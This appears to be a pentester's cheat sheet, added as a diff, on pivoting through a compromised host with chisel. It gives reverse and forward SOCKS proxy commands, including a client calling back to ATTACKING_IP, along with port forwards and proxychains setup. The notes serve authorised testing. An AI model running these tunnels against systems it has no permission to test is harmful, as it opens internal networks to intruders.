@@ -1,0 +1,46 @@
+***************************************************************************************************************************************************************************
+*** PIVOTING using 'chisel'
+***************************************************************************************************************************************************************************
+
+You must have an appropriate copy of the chisel binary on both the attack machine and the compromised machine.
+ You can find the binary for both Linux and Windows at - https://github.com/jpillora/chisel
+
+To set up a REVERSE SOCKS proxy with chisel;
+* On the attack machine:
+
+> ./chisel server -p <LISTEN PORT> --reverse &
+ This connects back from a compromised server to a listener waiting on our attacking machine.
+ 
+* On the compromised machine:
+
+> ./chisel client <ATTACKING_IP>:<LISTEN_PORT> R:socks &
+
+* Despite connecting back to port 1337 successfully, the actual proxy opens on 127.0.0.1:1080. As such, we will be using port 1080 when sending data through the proxy.
+
+FORWARD PROXIES are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells. 
+Generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections).
+
+To setup a forward proxy;
+* On the compromised machine:
+
+> ./chisel server -p LISTEN_PORT --socks5
+
+* And on the attack machine:
+
+> ./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
+In this command, PROXY_PORT is the port that will be opened for the proxy
+
+* Remeber to modify the 'Proxylist' in '/etc/proxchains.conf' based on whether you use SOCKS4 or SOCKS5 and on whether you use the reverse proxy or forward proxy.
+
+To create a REMOTE PORT FOWARD on the compromised machine, first in the attack machine start a listener as mentioned in the Reverse Proxy.
+ Then in the compromised machine, use:
+
+> ./chisel client <ATTACKING_IP>:<LISTEN_PORT> R:<COMPROMISED machine's LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
+
+For a LOCAL PORT FORWARD from the attack machine through the compromised machine; on the compromised machine, first start a listener. Then on the attack machine:
+
+> ./chisel client <LISTEN_IP>:<LISTEN_PORT> <Attacker's LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
+
+At the end of your engagment, use 'jobs' command to get the JOB ID of the 'chisel' processes, and use 'kill' command to stop these services.
+
+***************************************************************************************************************************************************************************
